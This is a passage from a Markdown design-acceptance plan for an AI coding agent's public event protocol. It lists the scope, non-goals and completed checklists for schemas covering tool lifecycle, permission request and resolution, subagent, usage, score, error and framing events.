- [x] all three constants exactly match their schema filenames and golden-envelope type values.
- [x] started requires non-empty input, model, mode, and effort; missing, empty, null, and non-string
  values fail closed.
- [x] finished requires a non-empty reason, validates `raw_reason` only when present, retains unknown
  fields, and accepts future reason values.
- [x] cancelled requires a non-empty reason and accepts future reason values.
- [x] all three typed payloads decode their goldens, and every envelope round-trips byte-for-byte.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2b4 completed content acceptance

Scope:

- Define `message.completed` as a public event name with one schema, typed payload, and compact
  golden envelope.
- Carry one required `text` string containing the full display-ready assistant-text snapshot, not
  merely the last delta, so replay remains authoritative when earlier deltas were coalesced or
  dropped.
- Permit an empty string because a finalized tool-only or interrupted assistant message can contain
  no display text while still being a real message boundary. Missing, null, and non-string text
  remain invalid.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No message ID, role, model, completion status, truncation flag, finish reason, tool call, reasoning,
  provider state, usage, annotations, or content-block union. The envelope and the dedicated turn,
  tool, reasoning, and accounting events own those facts.
- No event bus, delta aggregation, provider translation, engine wiring, persistence, transport, or
  CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly one known string field named `text`, imposes no non-empty
  constraint, and permits additive unknown fields.
- [x] missing, null, and non-string text fail closed, while empty, non-empty, and Unicode snapshots
  decode successfully.
- [x] the typed payload decodes the golden and the complete envelope round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c1 requested invocation acceptance

Scope:

- Define `tool.requested` as a public event name with one schema, typed payload, and compact golden
  envelope.
- Require a non-empty stable `id`, non-empty tool `name`, a non-empty `arguments` string containing
  complete valid JSON text, and an `executor` fixed to `kolk` or `provider`.
- Preserve argument bytes as a JSON-encoded string rather than parsing and reserializing them.
- Make ownership explicit: `executor: "kolk"` is eligible for Kolkrabbi's permission path, while
  `executor: "provider"` reports a tool the backend has already executed and therefore cannot be
  preceded by a Kolkrabbi permission request.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No canonical rewrite of upstream call IDs; a non-empty provider ID remains the correlation key.
- No `tool.delta`, `tool.started`, `tool.output`, `tool.finished`, `permission.requested`, or
  `permission.resolved` payload decision.
- No cross-event ordering, duplicate-ID tracking, tool-name registry, argument-schema validation,
  provider translation, permission engine, event bus, persistence, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly `id`, `name`, `arguments`, and `executor`, permits unknown fields,
  and restricts executor to `kolk` or `provider`.
- [x] missing, empty, null, and non-string identity/argument fields fail closed; malformed JSON text
  is also rejected.
- [x] missing, empty, null, non-string, and unknown executors fail closed, while both defined values
  decode successfully.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete envelope
  round-trips byte-for-byte without normalizing argument bytes.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c2a execution started acceptance

Scope:

- Define `tool.started` as a public event name with one schema, typed payload, and compact golden
  envelope.
- Require the non-empty tool-call `id` used by `tool.requested` and repeat the same `executor`
  ownership value so a lifecycle line never loses the `kolk` versus `provider` safety distinction.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No repeated tool name or arguments; `tool.requested` remains authoritative for the invocation.
- No output, success/error state, duration, start timestamp, process ID, permission state, or progress
  metadata. The envelope owns event time, and later execution events own output and outcome.
- No cross-event ID/executor consistency check, provider translation, tool runner instrumentation,
  permission engine, event bus, persistence, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly non-empty `id` and `executor`, permits unknown fields, and restricts
  executor to `kolk` or `provider`.
- [x] missing, empty, null, and non-string IDs fail closed.
- [x] missing, empty, null, non-string, and unknown executors fail closed, while both defined values
  decode successfully.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete envelope
  round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c2b execution output acceptance

Scope:

- Define `tool.output` as a public event name with one schema, typed payload, and compact golden
  envelope.
- Require the non-empty tool-call `id` used by `tool.requested`, a required string-valued `output`,
  and the same `executor` ownership value used across the tool lifecycle.
- Preserve an empty output as valid data because a completed provider tool can legitimately produce
  no display text.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No repeated tool name or arguments; `tool.requested` remains authoritative for the invocation.
- No success/error state, finish reason, duration, stream/chunk marker, stdout/stderr split,
  truncation marker, MIME type, encoding, or sequence number. `tool.finished` owns terminal outcome,
  and the envelope owns ordering and event time.
- No cross-event ID/executor consistency check, provider translation, tool runner instrumentation,
  permission engine, event bus, persistence, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly non-empty `id`, string-valued `output`, and `executor`, permits
  unknown fields, and restricts executor to `kolk` or `provider`.
- [x] missing, empty, null, and non-string IDs fail closed.
- [x] missing, null, and non-string output fail closed, while empty, non-empty, and Unicode output
  decode successfully.
- [x] missing, empty, null, non-string, and unknown executors fail closed, while both defined values
  decode successfully.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete envelope
  round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c2c execution finished acceptance

Scope:

- Define `tool.finished` as a public event name with one schema, typed payload, and compact golden
  envelope.
- Require the non-empty tool-call `id` used by `tool.requested`, a boolean `ok` terminal outcome,
  and the same `executor` ownership value used across the tool lifecycle.
- Define `ok` as whether the tool invocation produced a valid result. A subprocess non-zero exit may
  remain successful tool execution when its failure is returned as output for the model to inspect;
  provider `IsError` maps to `ok = !IsError`.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No repeated tool name, arguments, or output; preceding events remain authoritative for them.
- No error prose, finish reason, duration, exit code, signal, retryability, permission state,
  cancellation state, or timestamp. `tool.output` owns display text, while the envelope owns event
  time.
- No cross-event ID/executor consistency check, provider translation, tool runner instrumentation,
  permission engine, event bus, persistence, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly non-empty `id`, boolean `ok`, and `executor`, permits unknown
  fields, and restricts executor to `kolk` or `provider`.
- [x] missing, empty, null, and non-string IDs fail closed.
- [x] missing, null, and non-boolean outcomes fail closed, while both `true` and `false` decode
  successfully.
- [x] missing, empty, null, non-string, and unknown executors fail closed, while both defined values
  decode successfully.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete envelope
  round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c3a permission requested acceptance

Scope:

- Define `permission.requested` as a public event name with one schema, typed payload, and compact
  golden envelope.
- Require a non-empty opaque permission request `id`, non-empty tool name, and non-empty
  human-readable `detail` suitable for a terminal, desktop, or mobile approval surface.
- Allow an optional string `diff`; omission means that the action has no separate diff preview,
  while an explicitly empty string remains valid forward-compatible data.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No tool-call ID rewrite or cross-event correlation check; `id` identifies the permission
  round-trip defined by `/v1/permissions/{id}`.
- No `executor`: only `executor: "kolk"` tool requests are eligible for this event, while provider
  tools have already executed and can never request Kolkrabbi approval.
- No decision, allowed-choice list, timeout, expiration timestamp, policy-rule identity, risk score,
  path, command, parsed arguments, or structured diff. `permission.resolved` owns the later decision,
  and the envelope owns event time.
- No permission queue, decider, engine integration, HTTP endpoint, event bus, persistence, transport,
  or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches the schema filename and golden-envelope type value.
- [x] the schema requires exactly non-empty `id`, `tool`, and `detail`, permits optional
  string-valued `diff` and unknown fields, and defines no executor.
- [x] missing, empty, null, and non-string required fields fail closed.
- [x] omitted, empty, non-empty, and Unicode diffs decode successfully, while null and non-string
  diffs fail closed.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete envelope
  round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2c3b permission resolved acceptance

Scope:

- Define `permission.resolved` as a public event name with one schema, typed payload, and compact
  golden envelope.
- Require the non-empty permission request `id` from `permission.requested` and a closed `decision`
  vocabulary of `allow`, `allow_session`, or `deny`.
- Allow an optional non-empty human-readable `reason`. Server timeouts and unattended subagent
  defaults resolve as `deny` with a reason instead of inventing extra decision values.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No repeated tool, detail, diff, executor, policy rule, timeout, or expiration. The request remains
  authoritative for presentation data, and the envelope owns resolution time.
- No permanent `allow_always` decision; durable permission-rule editing is a separate configuration
  action, while `allow_session` is the only remembered runtime decision in this vocabulary.
- No cross-event ID check, serialized permission queue, timeout implementation, policy persistence,
  decider, engine integration, HTTP endpoint, event bus, storage, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the event and decision constants exactly match the schema filename, golden type, and closed
  decision vocabulary.
- [x] the schema requires exactly non-empty `id` and enumerated `decision`, permits an optional
  non-empty string `reason` and unknown fields, and defines no tool or executor.
- [x] missing, empty, null, and non-string IDs fail closed.
- [x] missing, empty, null, non-string, and unknown decisions fail closed, while all three defined
  decisions decode successfully.
- [x] omitted, non-empty, and Unicode reasons decode successfully, while empty, null, and non-string
  reasons fail closed.
- [x] the typed payload decodes the golden, marshals in schema field order, omits an absent reason,
  and the complete envelope round-trips byte-for-byte.
- [x] an unknown payload field remains in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d1 subagent lifecycle acceptance

Scope:

- Define `subagent.started` and `subagent.finished` as public event names with one schema, typed
  payload, and compact golden envelope each.
- Emit both lifecycle frames on the parent turn. Require a canonical `k_` task `id` and canonical
  `child_turn` so a client can associate the child turn's deltas, tools, completed message, usage,
  and diagnostics with the correct parallel subagent.
- Require `subagent.started` to carry the non-empty task description, non-empty resolved `mode`,
  and 1-based `index` and `total`; the index may not exceed the total.
- Require `subagent.finished` to repeat task identity, child-turn identity, and resolved mode, and
  to carry a required boolean `ok` terminal outcome.
- Keep both events additive with unknown payload fields retained by the envelope.

Non-goals:

- No model, effort, provider, timing, token, cost, output, summary, error text, tool state, or
  permission state. The child `turn.started`, `message.completed`, `usage.reported`, `error`, tool,
  and permission events own those facts.
- No nested subagent tree, background task, retry attempt, scheduling priority, concurrency limit,
  or cross-event state machine. Item 14 owns orchestration policy; this slice only makes its
  lifecycle representable.
- No event bus, engine/orchestrator integration, parallel execution, renderer, persistence,
  transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] both constants exactly match their schema filenames and golden-envelope type values.
- [x] both schemas require canonical task and child-turn IDs plus a non-empty mode, permit unknown
  fields, and encode no child result or error detail.
- [x] started requires a non-empty task and integer index/total values of at least one, with index
  no greater than total.
- [x] finished requires an explicitly present boolean `ok`; missing, null, and non-boolean values
  fail closed while both outcomes decode.
- [x] both typed payloads decode their goldens, marshal in schema field order, and each complete
  envelope round-trips byte-for-byte.
- [x] unknown payload fields remain in raw envelopes after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d4a usage reported acceptance

Scope:

- Define `usage.reported` as a public event name with one schema, typed payload, compact golden
  envelope, and a language-neutral mapping from the hardened provider accounting fields.
- Represent one accounting row for one model within one physical attempt. Require non-empty
  `model`, `provider_name`, and `request_model`, plus the positive `attempt`, non-empty open-ended
  `role` and `effort`, closed `cost_source`, and closed `measurement` vocabularies.
- Allow optional non-empty `response_model`, `finish_reason`, `error_type`, and `gen_id` strings.
- Allow optional non-negative integer `input_tokens`, `cache_read_tokens`, `cache_write_tokens`,
  `output_tokens`, `reasoning_tokens`, and `ttft_ms` values, and optional non-negative numeric
  `cost_usd`. Omission means unknown; an explicit zero remains measured zero.
- Preserve the cost distinction: `unknown` requires an omitted cost, `free` requires an explicit
  zero cost, and every other source requires an explicit cost.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No aggregate `total_tokens`; unknown component counts make a derived total potentially false.
- No raw provider usage, prompt or response content, rotated-model list, pricing snapshot, currency,
  budget, rate-limit state, tool count, rating, score, or session/turn IDs duplicated in data.
- No requirement that response model, finish reason, error type, generation ID, token counts, cost,
  or TTFT be known on every attempt.
- No provider-to-protocol adapter, event bus, stats migration, dashboard ingestion, persistence,
  transport, footer, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches its schema filename and golden-envelope type value.
- [x] schema, typed payload, mapping table, and validator expose exactly the frozen known fields and
  retain additive unknown fields.
- [x] all required identity, provenance, attempt, role, and effort fields reject absent, null,
  empty, malformed, or out-of-range values.
- [x] token and latency fields distinguish omitted from zero and reject null, negative,
  fractional, and non-numeric values.
- [x] cost distinguishes omitted from zero, rejects null, negative, and non-numeric values, and
  obeys the `unknown` / `free` / measured-source relationship.
- [x] optional response, finish, error, and generation strings reject empty, null, and non-string
  values when present.
- [x] every defined cost source and measurement value decodes, while unknown vocabulary values fail
  closed.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete
  envelope round-trips byte-for-byte.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d3 checkpoint created acceptance

Scope:

- Define `checkpoint.created` as a public event name with one schema, typed payload, and compact
  golden envelope.
- Represent one durable pre-write snapshot entry. Require a non-empty opaque `id`, non-empty
  open-ended `reason`, non-empty tool and path strings, and an explicitly present boolean
  `existed` describing the pre-write file state.
- Emit the future runtime event only after the checkpoint store has durably recorded the entry and
  before the corresponding write. The envelope remains the source of turn identity and event time.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No backup filename, snapshot bytes, checksum, file mode, secret/refusal metadata, store directory,
  manifest sequence, internal turn number, or repeated session/turn/time fields.
- No turn-level checkpoint aggregate, `checkpoint.updated`, rewind event, conversation rewind,
  bash-made change tracking, shadow Git, diff, or redo state.
- No checkpoint-store format change, ID generation, engine port, event bus, integration, persistence,
  transport, renderer, `/changes`, `/rewind`, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches its schema filename and golden-envelope type value.
- [x] the schema requires exactly ID, reason, tool, path, and existed as its known fields, permits
  unknown fields, and carries no backup or envelope metadata.
- [x] missing, empty, null, and non-string identity, reason, tool, or path values fail closed;
  future non-empty reason/tool values remain valid.
- [x] `existed` must be explicitly present and boolean-valued; both true and false decode.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete
  envelope round-trips byte-for-byte.
- [x] unknown payload fields remain in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d5a log diagnostics acceptance

Scope:

- Define `log` as a public event name with one schema, typed payload, and compact golden envelope.
- Require a closed `level` of `debug`, `info`, or `warn` and one closed diagnostic `code` covering
  the hardened provider warnings plus `deltas_dropped` for bus backpressure.
- Allow optional non-empty `field`, `was`, `became`, and `message` strings. Require `field` whenever
  `was` or `became` is present so a client never guesses what changed.
- Represent dropped-delta count inside the message while the field identifies the affected delta
  family; do not add an incompatible private renderer payload.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No `error` log level, stack trace, provider exception object, retry policy, HTTP status, exit code,
  or user remedy. The A6.3 error entity and `error` event own failures.
- No arbitrary unregistered code, structured metadata bag, source file/line, logger name, span ID,
  repeated event time, or secret-bearing raw value.
- No provider translation, bus backpressure implementation, redaction, persistence, transport,
  renderer, debug file, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches its schema filename and golden-envelope type value.
- [x] the schema requires exactly level and code, exposes only the six frozen known fields, permits
  unknown fields, and defines no error-only metadata.
- [x] all three levels and every defined code decode; missing, null, non-string, and unknown values
  fail closed.
- [x] optional field/transition/message strings reject empty, null, and non-string values when
  present, and transitions require a field.
- [x] the typed payload decodes the golden, marshals in schema field order, and the complete
  envelope round-trips byte-for-byte.
- [x] unknown payload fields remain in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d4b score recorded acceptance

Scope:

- Define `score.recorded` as a public event name with one schema, typed payload, and compact golden
  envelope.
- Require a non-empty opaque score `id`, a closed `target_kind` of `session`, `turn`, or `span`,
  the target `id`, a non-empty scorer `name`, a closed `data_type`, one value matching that type,
  and a closed `source` of `human`, `judge`, or `implicit`.
- Validate session and turn targets as canonical IDs. Keep span targets non-empty and opaque until
  A6.3 freezes the shared span entity and identifier vocabulary.
- Support numeric, categorical, boolean, and text values as their native JSON primitive. Require
  categorical and text strings to be non-empty.
- Require a non-empty `judge_model` only for judge-sourced scores and forbid it for other sources.
  Allow an optional non-empty human-readable `explanation` for every source.
- Keep the event additive with unknown payload fields retained by the envelope.

Non-goals:

- No universal scale, min/max, pass threshold, choice map, sampling rate, scorer prompt, expected
  answer, model output, rating aggregation, or score replacement policy. Scorer configuration owns
  those facts.
- No score timestamp duplicated in data; the envelope owns creation time.
- No canonical span ID decision, scorer registry, judge execution, implicit-signal collector,
  `/rate` migration, event bus, stats/dashboard ingestion, persistence, transport, or CLI change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the constant exactly matches its schema filename and golden-envelope type value.
- [x] schema and typed payload expose exactly the frozen fields, encode the primitive value union,
  permit unknown fields, and duplicate no envelope field.
- [x] score identity, target kind/identity, and scorer name reject missing, null, empty, malformed,
  or unknown values.
- [x] all four data types accept only their matching JSON primitive; null, object, array, and
  mismatched values fail closed, and categorical/text strings must be non-empty.
- [x] all three source values decode; unknown sources fail closed; judge model is required only for
  judge scores and optional explanation validates when present.
- [x] the typed payload decodes the golden, retains the decoded value primitive, marshals in schema
  field order, and the complete golden envelope round-trips byte-for-byte.
- [x] unknown payload fields remain in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3a error entity and mapping acceptance

Scope:

- Define one public error entity with a closed machine-readable `code`, a required safe display
  `message`, an optional positive `retry_after_ms`, and an optional non-empty user-facing `remedy`.
- Define one exhaustive table mapping every code to the Kolkrabbi HTTP response status, shell exit
  code, and default retryability. HTTP status describes Kolkrabbi's transport response, not the raw
  status returned by an upstream model provider.
- Define retryability as a safe default before content is committed. The future decision policy may
  still refuse a replay after content, cancellation, an exhausted attempt budget, or a long delay.
- Keep client mistakes (`invalid_argument`, exit 2) distinct from an invalid upstream request
  caused by Kolkrabbi (`invalid_request`, exit 1 and HTTP 500).
- Cover current CLI failures, every hardened provider failure kind, and `cursor_expired` for event
  replay outside the retained window.

Non-goals:

- No provider raw body, provider error code, stack trace, secret-bearing metadata, arbitrary detail
  map, model rotation list, cooldown state, partial output, or retry-policy attempt counters.
- No duplicate HTTP status, exit code, or retryable boolean on the wire; all three derive from the
  stable code table.
- No provider error translation, CLI exit refactor, HTTP handler, event emission, bus, persistence,
  renderer, automatic retry, or model switch in this slice.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the language-neutral schema and compact golden entity expose only the four frozen fields,
  require code/message, permit additive unknown fields, and contain no private provider data.
- [x] all 28 codes have exactly one HTTP/exit/retryability row, and schema, Markdown table, Go
  constants, and Go lookup behavior agree exhaustively.
- [x] missing, null, empty, wrongly typed, or unknown code/message values fail closed.
- [x] optional retry delay accepts only positive integer milliseconds; optional remedy accepts only
  a non-empty string; both reject explicit null.
- [x] typed JSON preserves field order, implements a safe Go error string, and derives policy only
  from the code while invalid programmatic codes fail closed.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d5b error event acceptance

Scope:

- Define `error` as a public event name whose data is exactly the A6.3a shared error entity.
- Make the event schema reference the entity schema and make the Go event decoder call the same
  entity validator, so transport and event failures cannot drift.
- Keep envelope session, turn, sequence, and timestamp as the only event context.

Non-goals:

- No second error vocabulary, copied policy columns, severity, stack trace, provider raw body,
  source location, attempt state, partial content, automatic retry, rotation, or rendering decision.
- No event ordering or exactly-once rule; A7 owns bus delivery and A8/A9 own terminal orchestration.
- No provider translation, CLI exit refactor, HTTP response, persistence, transport, or UI change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the `error` constant exactly matches its schema filename and golden-envelope type value.
- [x] the event schema references the one shared error schema instead of restating any entity field.
- [x] the event accepts every defined code and rejects malformed entity data through the shared
  validator.
- [x] the golden event data is byte-identical to the golden entity, decodes into the public error
  type, and the complete envelope round-trips byte-for-byte.
- [x] unknown entity fields remain in the raw envelope after decode.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2d5c event vocabulary closure acceptance

Scope:

- Define one ordered public catalog of every event shipped by protocol version 0.
- Parse the Go declarations in conformance tests and prove every exported `Event…` constant is an
  explicit `EventType` string literal represented exactly once in the catalog.
- Prove the catalog, event-schema filenames, schema IDs, golden-envelope filenames, and decoded
  golden types are the same set with no missing or orphan contract file.

Non-goals:

- No saga chapter event placeholders; an event is not shipped until its owning state machine is
  frozen and its constant, schema, fixture, payload, and validator land together.
- No rejection of syntactically valid future event names. Unknown events remain forward-compatible
  even though the current shipped catalog is closed and enumerable.
- No stream ordering, cross-event lifecycle validation, bus, persistence, transport, provider,
  engine, CLI, or UI behavior.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the public catalog contains exactly the 23 currently shipped event types in architectural
  order and returns a defensive copy.
- [x] AST-derived exported event constants and catalog values match exactly with no duplicate name
  or wire value.
- [x] schema and golden directories each contain exactly one file per catalog value and no orphan.
- [x] every schema is valid JSON with the canonical versioned ID, and every golden decodes to the
  event type named by its filename.
- [x] a syntactically valid unknown event still decodes, preserving forward compatibility.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3b1 usage entity acceptance

Scope:

- Promote the already-frozen per-model, per-physical-attempt accounting row into
  `schemas/entities/usage.json` and a public `Usage` Go type.
- Preserve `UsageReportedData` as an alias of that shared type and make `usage.reported` reference
  the entity schema and call the entity validator.
- Add a compact entity golden whose bytes are exactly the data bytes in the existing event golden.

Non-goals:

- No aggregate session/model usage response, new fields, changed unknown/zero semantics, cost
  calculation, provider translation, recorder migration, database, dashboard, or export behavior.
- No schema duplication between entity and event and no second Go struct for the same row.
- No event bus, engine integration, persistence, transport, CLI, or UI change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the entity schema owns the exact 19-field accounting contract and the event schema contains
  only a reference to it.
- [x] `Usage` is the sole Go struct while `UsageReportedData` remains a source-compatible alias.
- [x] entity and event use the same validator and preserve all prior presence, cost-source, and
  measurement invariants.
- [x] entity golden bytes exactly equal event golden data and typed JSON field order remains stable.
- [x] unknown entity fields remain forward-compatible.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3b2 score entity acceptance

Scope:

- Promote the already-frozen typed evaluation into `schemas/entities/score.json` and a public
  `Score` Go type.
- Preserve `ScoreRecordedData` as an alias of that shared type and make `score.recorded` reference
  the entity schema and call the entity validator.
- Add a compact entity golden whose bytes are exactly the data bytes in the existing event golden.

Non-goals:

- No new score fields, score scale, aggregation, replacement policy, scorer configuration, judge
  execution, implicit-signal collection, canonical span identity, or stats migration.
- No schema duplication between entity and event and no second Go struct for the same evaluation.
- No event bus, engine integration, persistence, transport, CLI, or UI change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the entity schema owns the exact nine-field evaluation contract and its five conditional
  clauses; the event schema contains only a reference to it.
- [x] `Score` is the sole Go struct while `ScoreRecordedData` remains a source-compatible alias.
- [x] entity and event use the same validator and preserve target, value-type, source, judge-model,
  and explanation invariants.
- [x] entity golden bytes exactly equal event golden data and typed JSON/RawMessage behavior stays
  stable.
- [x] unknown entity fields remain forward-compatible.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3c1 permission resolve command acceptance

Scope:

- Define `permission.resolve` as a client-to-server command name with a language-neutral schema,
  compact golden body, and public Go binding.
- Require one non-empty opaque pending-permission `id` and one existing closed decision of `allow`,
  `allow_session`, or `deny`.
- Permit additive unknown fields for protocol evolution while keeping the two known fields exact.

Non-goals:

- No client-supplied resolution `reason`; server timeout/policy context belongs on the emitted
  `permission.resolved` event.
- No pending-permission entity, ID format, expiry, conflict/already-resolved response, decision
  storage, timeout policy, HTTP path, stdio wrapper, event emission, or engine decision port.
- No second decision enum and no import from private engine/agent packages.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] command constant, schema filename, schema ID, and golden filename agree on
  `permission.resolve`.
- [x] schema and Go binding expose exactly `id` then `decision`, require both, permit additive
  unknown fields, and define no reason/tool/detail/expiry fields.
- [x] all three existing decisions validate; missing, null, empty, wrongly typed, or unknown ID or
  decision values fail closed.
- [x] typed JSON preserves field order and the golden body round-trips byte-for-byte.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3c2 turn cancel command acceptance

Scope:

- Define `turn.cancel` as a client-to-server command name with a language-neutral schema, compact
  golden body, and public Go binding.
- Require exactly one canonical `turn_id`, allowing every transport and native binding to cancel by
  value without carrying a Go `context.Context`.
- Permit additive unknown fields for protocol evolution while keeping the known target exact.

Non-goals:

- No client-supplied cancellation reason; the server emits the factual reason on `turn.cancelled`.
- No session ID, cancellation result body, idempotency/conflict policy, turn registry, context
  lookup, HTTP path, stdio wrapper, event emission, or engine integration.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] command constant, schema filename, schema ID, and golden filename agree on `turn.cancel`.
- [x] schema and Go binding expose exactly one required `turn_id`, permit additive unknown fields,
  and define no session/reason/runtime fields.
- [x] canonical turn IDs validate; missing, null, empty, wrongly typed, or noncanonical values fail
  closed, including session/task IDs with otherwise valid ULID bodies.
- [x] typed JSON preserves field order and the golden body round-trips byte-for-byte.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.3c5 command vocabulary closure acceptance

Scope:

- Define one ordered public catalog of commands actually shipped by protocol version 0.
- Parse Go declarations in conformance tests and prove every exported `Command…` constant is an
  explicit `CommandType` string literal represented exactly once in the catalog.
- Prove catalog values, command-schema filenames, canonical schema IDs, golden-body filenames, and
  validators are the same set with no missing or orphan contract file.

Non-goals:

- No `turn.create`, `session.fork`, or `session.list` placeholder before their A10-owned session
  semantics are stable.
- No command envelope, transport dispatch, HTTP route, stdio framing, authentication, or handler.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] the public catalog contains exactly `turn.cancel` and `permission.resolve` in architectural
  order and returns a defensive copy.
- [x] AST-derived exported command constants and catalog values match exactly with no duplicate
  name or wire value.
- [x] schema and golden directories each contain exactly one file per catalog value and no orphan.
- [x] every schema has the canonical versioned ID; every golden is one valid JSON object accepted by
  its command validator.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.4a single-event framing acceptance

Scope:

- Define normative event framing in `spec/stdio.md` for stdout NDJSON, child stdio NDJSON, and HTTP
  SSE without defining command-direction framing prematurely.
- Add public encoders for one validated NDJSON event line and one validated SSE event block.
- Require SSE `id` to be the decimal envelope sequence, `event` to be the exact event type, and
  `data` to be the exact compact envelope bytes used by NDJSON.
- Define the SSE heartbeat as the exact comment block `: ping\n\n`; timing remains server policy.

Non-goals:

- No stream reader, multi-line SSE input, retry field/value, Last-Event-ID handling, heartbeat
  scheduler, HTTP flush, content type, event replay, bus, daemon, CLI flag, or command stdio wrapper.
- No normalization, pretty printing, CRLF, multiline data field, blank NDJSON line, or trailing
  whitespace.
